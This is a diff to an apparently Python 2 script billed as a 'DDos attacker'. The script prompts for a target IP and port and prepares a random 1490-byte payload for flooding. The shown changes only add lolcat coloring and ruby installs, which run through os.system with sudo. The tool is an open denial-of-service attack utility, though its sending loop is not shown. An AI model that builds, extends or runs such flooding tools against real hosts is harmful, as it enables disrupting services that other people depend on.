@@ -18,9 +18,13 @@ bytes = random._urandom(1490)
 #############
 
 os.system("pkg install figlet -y")
-os.system("sudo apt-get install figlet")
+os.system("pkg install ruby -y")
+os.system("gem install lolcat")
+os.system("sudo apt-get install figlet -y")
+os.system("sudo apt-get install ruby -y")
+os.system("sudo gem install lolcat")
 os.system("clear")
-os.system("figlet DDos attacker")
+os.system("figlet DDos attacker | lolcat")
 
 print
 print "Creator : Jasem-codect"
@@ -31,7 +35,7 @@ ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+os.system("figlet Attack Starting | lolcat")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
